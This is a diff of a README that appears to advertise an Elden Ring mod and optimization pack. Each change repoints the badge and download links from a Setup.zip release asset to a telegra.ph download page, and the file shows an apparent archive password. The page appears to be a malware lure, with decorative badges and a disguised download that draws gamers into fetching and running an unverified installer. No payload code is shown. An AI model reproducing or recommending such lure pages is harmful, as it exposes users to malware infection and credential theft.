@@ -1,14 +1,14 @@
 # 🎮 Elden Ring Mods — Optimization Pack, Tips & Ultimate Guide 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Elden-Ring)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
-[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Elden-Ring)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)](https://telegra.ph/Download-05-21-39)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 <img src="https://cdn.akamai.steamstatic.com/steam/apps/1245620/header.jpg" alt="banner" width="100%" />
 
@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-[![Elden Ring Mods](https://img.shields.io/badge/Download%20Elden%20Ring%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Floodbentend/Elden-Ring-Bug-Fixes/releases/download/Release/Setup.zip)
+[![Elden Ring Mods](https://img.shields.io/badge/Download%20Elden%20Ring%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
